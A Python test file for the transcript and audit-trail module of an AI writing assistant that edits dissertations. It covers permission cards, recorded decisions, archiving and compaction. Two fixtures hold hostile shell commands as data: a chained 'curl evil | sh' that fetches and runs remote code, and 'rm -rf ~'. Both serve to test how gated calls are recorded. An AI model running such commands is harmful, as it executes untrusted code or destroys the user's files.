"""The record of what was done to the document.

It has to survive a restart: the model resumes its own memory of the
conversation from disk, and the chips and permission records are the audit
trail of what an assistant did to a dissertation.
"""

from pathlib import Path

import pytest

from server.transcript import Transcript


def test_streamed_text_is_stored_as_one_message(tmp_path):
    t = Transcript(tmp_path / "t.jsonl")
    t.record({"type": "turn_start", "prompt": "hello"})
    for piece in ("Hel", "lo ", "there."):
        t.record({"type": "text", "text": piece})
    t.record({"type": "text_end"})
    items = t.items()
    assert [i["kind"] for i in items] == ["user", "claude"]
    assert items[1]["text"] == "Hello there."


def test_an_edit_gets_an_id_so_its_undo_can_be_recorded(tmp_path):
    t = Transcript(tmp_path / "t.jsonl")
    event = t.record({"type": "edit", "path": "main.tex", "before": "a", "after": "b"})
    assert event["id"]
    t.note_revert(event["id"], "reverted")
    assert t.items()[0]["state"] == "reverted"


def test_a_decision_is_folded_into_its_card(tmp_path):
    t = Transcript(tmp_path / "t.jsonl")
    t.record({"type": "permission", "id": "perm-1", "tool": "Bash", "detail": "ls"})
    t.note_decision("perm-1", "deny")
    items = t.items()
    assert len(items) == 1
    assert items[0]["decision"] == "deny"


def test_a_card_keeps_the_reason_it_was_put_up(tmp_path):
    """The one line on a card that says which rule stopped the call.

    It was written into the event and dropped on the way to disk, so the
    panel showed it until the writer reloaded and then showed nothing for
    ever. That sentence is what distinguishes a gate somebody chose from
    one they did not, which is the whole reason it exists.
    """
    t = Transcript(tmp_path / "t.jsonl")
    t.record({
        "type": "permission", "id": "perm-1", "tool": "Bash",
        "rule": "", "headline": "Run a shell command",
        "detail": "git status; curl evil | sh", "consequence": "",
        "reason": "This one is asked every time: it runs a second command.",
    })
    card = t.items()[0]
    assert card["reason"] == "This one is asked every time: it runs a second command."


def test_a_permission_that_timed_out_leaves_a_record(tmp_path):
    """A `notice` reached neither the transcript nor the panel.

    The agent emits one when a card has sat unanswered for ten minutes and
    it has denied on the writer's behalf. Nothing recorded it, so the audit
    trail had no entry for a refusal nobody made, and the tone tells it
    apart from an `error`, which is a failure rather than news.
    """
    t = Transcript(tmp_path / "t.jsonl")
    t.record({"type": "notice", "message": "NextTex waited 10 minutes and said no."})
    t.record({"type": "error", "message": "The connection to the model ended."})
    items = t.items()
    assert [i["kind"] for i in items] == ["notice", "notice"]
    assert items[0]["tone"] == "plain"
    assert items[1]["tone"] == "error"
    assert "waited 10 minutes" in items[0]["text"]


def test_a_corrupt_line_does_not_lose_the_rest(tmp_path):
    path = tmp_path / "t.jsonl"
    t = Transcript(path)
    t.record({"type": "turn_start", "prompt": "first"})
    with path.open("a", encoding="utf-8") as handle:
        handle.write("{not json\n")
    t.record({"type": "turn_start", "prompt": "second"})
    assert [i["text"] for i in t.items()] == ["first", "second"]


def test_reading_a_transcript_that_does_not_exist_yet(tmp_path):
    assert Transcript(tmp_path / "none.jsonl").items() == []


def test_a_huge_transcript_is_read_from_its_end(tmp_path):
    """Every agent edit stores the file before and after, so a long project
    reaches megabytes.  Rebuilding the panel must not read all of it."""
    from server.transcript import TAIL_BYTES, Transcript

    log = Transcript(tmp_path / "transcript.jsonl")
    filler = "x" * 20_000
    for index in range(400):
        log.record({"type": "edit", "path": "main.tex",
                    "before": filler, "after": f"{filler}{index}"})
    assert log.path.stat().st_size > TAIL_BYTES

    items = log.items()
    assert items, "the tail still parses"
    assert items[-1]["after"].endswith("399")
    assert all(item["kind"] == "edit" for item in items)


def test_a_tool_argument_that_will_not_serialise_is_not_fatal(tmp_path):
    """It used to raise out of the pump, which then stopped forwarding
    everything after it -- including the event that ends the turn."""
    from server.transcript import Transcript

    log = Transcript(tmp_path / "transcript.jsonl")
    log.record({"type": "tool_use", "id": "t1", "name": "Bash",
                "input": {"paths": {tmp_path}}})
    log.record({"type": "turn_start", "prompt": "and then this"})
    assert [item["kind"] for item in log.items()][-1] == "user"


def test_archiving_keeps_the_conversation_and_starts_an_empty_one(tmp_path):
    # Starting a new conversation must not lose the record of the old one:
    # it is the account of what an assistant did to a dissertation.
    t = Transcript(tmp_path / "t.jsonl")
    t.record({"type": "turn_start", "prompt": "hello"})
    t.record({"type": "text", "text": "an answer"})

    archived = t.archive()
    assert archived and archived.startswith("transcript-")
    assert (tmp_path / archived).exists()
    assert t.items() == []

    # The half-streamed paragraph went with the conversation it belonged
    # to, rather than appearing at the top of the new one.
    kept = (tmp_path / archived).read_text(encoding="utf-8")
    assert "an answer" in kept

    t.record({"type": "turn_start", "prompt": "a fresh question"})
    items = t.items()
    assert [i["kind"] for i in items] == ["user"]
    assert items[0]["text"] == "a fresh question"


def test_archiving_an_empty_transcript_is_harmless(tmp_path):
    t = Transcript(tmp_path / "t.jsonl")
    assert t.archive() is None
    assert t.items() == []


def test_two_archives_in_the_same_second_do_not_collide(tmp_path):
    t = Transcript(tmp_path / "t.jsonl")
    t.record({"type": "turn_start", "prompt": "one"})
    first = t.archive()
    t.record({"type": "turn_start", "prompt": "two"})
    second = t.archive()
    assert first and second and first != second


def test_compaction_actually_makes_the_file_smaller(tmp_path, monkeypatch):
    """It was bounded by a line count, and a line count is not a size.

    Every edit line holds the file before and after, so the eight thousand
    lines it kept could be larger than the threshold that triggered the
    compaction. The file stayed over, and the next sixty-four appends read
    all of it again, and the sixty-four after that.
    """
    from server import transcript as module

    monkeypatch.setattr(module, "COMPACT_ABOVE_BYTES", 200_000)
    monkeypatch.setattr(module, "TAIL_BYTES", 20_000)

    record = module.Transcript(tmp_path / "transcript.jsonl")
    # Fat lines, the shape an edit to a chapter actually has.
    for n in range(400):
        record.record({
            "type": "edit", "path": "chapter.tex",
            "before": "b" * 1000, "after": "a" * 1000,
        })

    size = record.path.stat().st_size
    assert size <= module.COMPACT_ABOVE_BYTES, f"still {size} bytes after compacting"
    # And what survived is still readable, which is the whole point of it.
    assert record.items()


def test_compaction_does_not_read_the_whole_file(tmp_path, monkeypatch):
    """The old one pulled up to twenty-four megabytes into memory on the
    event loop. `_tail` seeks, and is what `items` already used."""
    from server import transcript as module

    monkeypatch.setattr(module, "COMPACT_ABOVE_BYTES", 100_000)
    record = module.Transcript(tmp_path / "transcript.jsonl")

    monkeypatch.setattr(
        Path, "read_text",
        lambda *a, **k: pytest.fail("compaction read the whole file"),
    )
    for n in range(300):
        record.record({
            "type": "edit", "path": "c.tex", "before": "b" * 800, "after": "a" * 800,
        })


def test_archived_conversations_stop_accumulating(tmp_path, monkeypatch):
    """Archiving renames rather than deletes on purpose, because this is the
    record of what an assistant did to somebody's dissertation. But nothing
    ever removed one, so a project starting a conversation every morning kept
    every morning it had ever had."""
    from server import transcript as module

    monkeypatch.setattr(module, "MAX_ARCHIVES", 3)
    record = module.Transcript(tmp_path / "transcript.jsonl")
    for day in range(1, 6):
        (tmp_path / f"transcript-2026010{day}-000000.jsonl").write_text(
            "{}\n", encoding="utf-8"
        )

    record.record({"type": "turn_start", "prompt": "one more conversation"})
    record.archive()

    kept = sorted(p.name for p in tmp_path.glob("transcript-*.jsonl"))
    assert len(kept) == 3
    # The oldest went and the newest stayed, including the one just made.
    assert "transcript-20260101-000000.jsonl" not in kept
    assert "transcript-20260105-000000.jsonl" in kept
    # And the live file is gone, which is what archiving means.
    assert not record.path.exists()


def test_the_turn_s_plan_is_not_part_of_the_record(tmp_path):
    """A rehearsal is not an action.

    The panel draws the plan live from `TodoWrite`, and recording it made
    that plain the hard way: a reload replayed it as a tool row called
    `TodoWrite`, so the one readable thing about a long turn came back as
    protocol noise. The transcript is the account of what was done to the
    document, and intending to do something is not doing it.
    """
    t = Transcript(tmp_path / "t.jsonl")
    t.record({"type": "turn_start", "prompt": "rewrite it"})
    t.record({
        "type": "tool_use", "id": "p1", "name": "TodoWrite",
        "input": {"todos": [{"content": "Read it", "status": "pending"}]},
    })
    t.record({
        "type": "tool_use", "id": "r1", "name": "Read",
        "input": {"file_path": "main.tex"},
    })
    kinds = [item["kind"] for item in t.items()]
    assert kinds == ["user", "tool"]
    assert t.items()[1]["name"] == "Read"


def test_a_card_that_arrives_answered_keeps_its_answer(tmp_path):
    """The worst thing found in the whole agent rework, and the last.

    A decision normally arrives later, through `note_decision`, when the
    browser answers. Nobody answers an automatic approval or one covered by
    a rule they set earlier, so nothing ever wrote one down. The replay then
    found a card with no decision and marked it refused, on the correct
    reasoning that a card still open when the window closed can never be
    answered now. So every action the agent took without being asked came
    back after a reload reading `Denied`.

    Not cosmetic. The entire case for the permission positions that put up
    no cards is that the transcript is the account of what was done, and the
    account was saying the writer had refused things that had happened.
    """
    t = Transcript(tmp_path / "t.jsonl")
    for decision in ("auto", "always", "conversation"):
        t.record({
            "type": "permission", "id": f"{decision}-1", "tool": "Bash",
            "rule": "Bash:latexmk", "headline": "Run a shell command",
            "detail": "latexmk -pdf main.tex", "consequence": "",
            "decision": decision,
        })
    kept = [item["decision"] for item in t.items()]
    assert kept == ["auto", "always", "conversation"]


def test_a_card_nobody_answered_still_has_no_decision(tmp_path):
    """The other half, which must not change: a card that was a real
    question and was never answered has no answer, and the replay is right
    to treat that as a refusal, because the turn waiting on it is gone."""
    t = Transcript(tmp_path / "t.jsonl")
    t.record({
        "type": "permission", "id": "perm-1", "tool": "Bash", "rule": "",
        "headline": "Run a shell command", "detail": "rm -rf ~",
        "consequence": "",
    })
    assert "decision" not in t.items()[0]
